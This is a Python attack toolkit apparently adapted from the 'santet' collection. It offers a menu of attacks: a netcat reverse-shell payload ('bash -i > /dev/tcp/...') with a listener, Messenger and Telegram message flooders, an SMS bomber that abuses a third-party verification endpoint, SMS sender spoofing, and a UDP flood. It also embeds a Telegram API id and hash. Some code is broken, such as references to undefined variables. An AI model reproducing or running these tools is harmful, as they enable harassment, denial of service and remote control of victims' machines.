import os
try:
	os.remove("..spam.py")
except:
	pass
try:
	os.remove("/sdcard/download/..spam.py")
except:
	pass
#########################################
if os.name=="posix":
	try:
		import telethon
	except:
		os.system("pip install telethon")
	import os, sys, time, socket, random, requests
	from telethon import TelegramClient, sync, utils
	telegramspam_banner='''
	  ██████  ██▓███   ▄▄▄       ███▄ ▄███▓   ▄▄▄█████▓▓█████  ██▓    ▓█████   ▄████  ██▀███   ▄▄▄       ███▄ ▄███▓
	▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒   ▓  ██▒ ▓▒▓█   ▀ ▓██▒    ▓█   ▀  ██▒ ▀█▒▓██ ▒ ██▒▒████▄    ▓██▒▀█▀ ██▒
	░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░   ▒ ▓██░ ▒░▒███   ▒██░    ▒███   ▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄  ▓██    ▓██░
	  ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██    ░ ▓██▓ ░ ▒▓█  ▄ ▒██░    ▒▓█  ▄ ░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██ ▒██    ▒██ 
	▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒     ▒██▒ ░ ░▒████▒░██████▒░▒████▒░▒▓███▀▒░██▓ ▒██▒ ▓█   ▓██▒▒██▒   ░██▒
	▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░     ▒ ░░   ░░ ▒░ ░░ ▒░▓  ░░░ ▒░ ░ ░▒   ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ░  ░
	░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░       ░     ░ ░  ░░ ░ ▒  ░ ░ ░  ░  ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░
	░  ░  ░  ░░         ░   ▒   ░      ░        ░         ░     ░ ░      ░   ░ ░   ░   ░░   ░   ░   ▒   ░      ░   
	      ░                 ░  ░       ░                  ░  ░    ░  ░   ░  ░      ░    ░           ░  ░       ░   
	'''
	def clearscreen():
		if sys.platform == "linux2":
			os.system("clear")
		elif sys.platform == "win32":
			os.system("cls")
		else:
			os.system("clear")
	
	def restart_program():
		python = sys.executable
		os.execl(python, python, * sys.argv)
		curdir = os.getcwd()
	
	def backtomenu_option():
		print(backtomenu_banner)
		backtomenu = input("santet > ")
		
		if backtomenu == "99":
			restart_program()
		elif backtomenu == "00":
			sys.exit()
		else:
			print("\nERROR: Wrong input")
			time.sleep(2)
			restart_program()
	
	
	
	while True:
		try:
			santet = "1"
			
			if santet == "00104320" or santet == "102340":
				nccheck = os.system("which nc")
				if nccheck != 0:
					print("[-] Netcat not installed yet!!!")
					backtomenu_option()
				else:
					print("\n  01) Generate Payload")
					print("  02) Start a Listener")
					print("\n  00) Exit")
					netcatrat = input("\nsantet > ")
					if netcatrat.strip() in "01 1".split():
						lhost = input("\nsantet > set LHOST ")
						lport = input("santet > set LPORT ")
						output = input("santet > set OUTPUT ")
						try:
							file = open(output, 'w')
							file.write("bash -i > /dev/tcp/%s/%s 0<&1 2>&1" % (lhost,lport))
							file.close()
							slistener = input("\nStart Listener? [y/N] ")
							if slistener.strip() in "y Y".split():
								lhost = input("\nsantet > set LHOST ")
								lport = input("santet > set LPORT ")
								os.system("echo && nc -lvp %s %s" % (lport, lhost))
								backtomenu_option()
							elif slistener.strip() in "n N".split():
								backtomenu_option()
							else:
								print("")
						except IOError as e:
							print("\nERROR:",e)
							backtomenu_option()
					elif netcatrat.strip() in "02 2".split():
						lhost = input("\nset LHOST ")
						lport = input("set LPORT ")
						os.system("echo && nc -lvp %s %s" % (lport, lhost))
						backtomenu_option()
					elif netcatrat.strip() in "00 0".split():
						restart_program()
					else:
						print("\nERROR: Wrong Input")
						time.sleep(2)
						restart_program()
			elif santet == "023200" or santet == "242300":
				if os.path.isfile("token.log"):
					access_token = open("token.log","r").read()
				else:
					access_token = str(input("santet > set ACCESS_TOKEN "))
					open("token.log","w").write(access_token)
				recipient_id = str(input("santet > set RECIPIENT_ID "))
				try: count = int(input("santet > set COUNT "))
				except(ValueError): count = 100
				message = str(input("santet > set MESSAGE "))
				headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 OPR/44.6.2246.127414","Content-Type": "application/json"}
				data = {"recipient": {"id": recipient_id},"message": {"text": message}}
				for x in range(count):
					r = requests.post("https://graph.facebook.com/v6.0/me/messages?access_token={}".format(access_token), params=data, headers=headers)
					if r.status_code == 200:
						sys.stdout.write(u"\u001b[1000D[*] Sent {} messages to {}...".format(x+1, recipient_id))
					else:
						sys.stdout.write(u"\u001b[1000D[!] Failed to send messages...")
					sys.stdout.flush()
				print("\n[!] Done ... !!\n")
				backtomenu_option()
			elif santet == "030320" or santet == "0304230":
				os.system("clear")
				phone_number = input("raqamy telegram aka bnwsa: ")
				countx = input("COUNT: ")
				countx = int(countx)
				param = {'phone':''+phone_number,'smsType':'1'}
				count = 0
				while (count < countx):
					r = requests.post('http://sc.jd.id/phone/sendPhoneSms', data=param)
					if '"success":true' in r.text:
						print("\n\033[1;32m[  OK  ] Send Succesful...Sleep for 1 second...\033[0m")
					else:
						print("\n\033[1;31m[FAILED] Send Failed...Sleep for 1 second...\033[0m")
					time.sleep(1)
					count = count + 1
				print("\033[1;33m[ DONE ] Stopped...\033[0m")
				backtomenu_option()
			elif santet == "040042000" or santet == "4004200":
				usernm = input("Username: ")
				passwd = input("Password: ")
				recipient = input("To: ")
				sender = input("From: ")
				messagetext = input("Message: ")
				url = "https://api.46elks.com/a1/SMS"
				r = requests.post(url, data={'to': recipient,'from': sender,'message': messagetext}, auth=(usernm, passwd))
				print(r.json())
				backtomenu_option()
			elif santet == "050240" or santet == "5042000":
				sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				bytes = random._urandom(1490)
				ip_addr = input("santet > set IP_ADDR ")
				port = input("santet > set PORT ")
				print("\n[~] Start to Attacking...\n")
				time.sleep(2.5)
				sent = 0
				while True:
					try:
						sock.sendto(bytes, (ip_addr,int(port)))
						sent = sent + 1
						print("Sent %s packet to %s throught port:%s"%(sent,ip_addr,port))
					except(KeyboardInterrupt):
						print("\n[!] Stop sending packet to %s..." %ip_addr)
						break
					except(EOFError):
						print("\n[!] Stop sending packet to %s..." %ip_addr)
						break
				backtomenu_option()
			elif santet == "06" or santet == "1":
				os.system("clear")
				print(telegramspam_banner)
				api_id = 1148490
				api_hash = 'd82c81323285aeb9c2ba9ee420d8b009'
				client = TelegramClient('client',api_id,api_hash).start()
				target = input("ZED > set USERNAME/ID ")
				try: count = int(input("ZED >  Bry nardn : "))
				except(ValueError): count = 100
				urmsg = input("ZED >  MESSAGE Akat ! : ")
				for x in range(count):
					client.send_message(target, urmsg)
					sys.stdout.write(u"\u001b[1000D[*] Sent {} messages to {}...".format(x+1, target))
					sys.stdout.flush()
				print("\n[!] Done ... !!\n")
				backtomenu_option()
			elif santet == "070000" or santet == "70000":
				print(help_msg)
			elif santet == "00" or santet == "0":
				sys.exit()
			elif santet.lower() == "help":
				print(help_msg)
			elif santet.lower() == "banner":
				print(__banner__)
			elif santet.lower() == "clear":
				clearscreen()
			elif santet.lower() == "restart":
				restart_program()
			elif santet.lower() == "contact":
				print("Instagram: @dtlily\nTelegram: @dtlily\nFacebook: cgi.izo\nGitHub: Gameye98\nGitLab: dtlily\nYoutube: dtlily")
			elif santet.lower() == "about":
				print("Version 1.1\n\nCopyright (C) 2019 by DedSecTL\n\nDedSecTL\nCvar1984\nCiKu370\nMr.TenSwapper07\namsitlab\n[M]izuno\n3RROR_TMX\nMr.K3N\nZetSec\nTroublemaker97\nL_Viole\nX14N23N6\nMR.R45K1N\nlord.zephyrus\n4cliba788\nmr0x100\nMrx04\nViruz\nMr_007\nITermSec\nIdannovita.\nBlackHole Security.")
			elif santet.lower() == "version":
				print("Version 1.1")
			elif santet.lower() == "exit":
				sys.exit()
			else:
				pass
		except(telethon.errors.rpcerrorlist.PhoneNumberInvalidError):
			print("The phone number is invalid (caused by SendCodeRequest)")
			print("You need to register your phone number first into Telegram\n")
		except(KeyboardInterrupt):
			print("\n[!] Close the program...")
			break
		except(EOFError):
			print("\n[!] Close the program...")
			break
		except Exception as e:
			print("\n[!] Error: "+e)
	
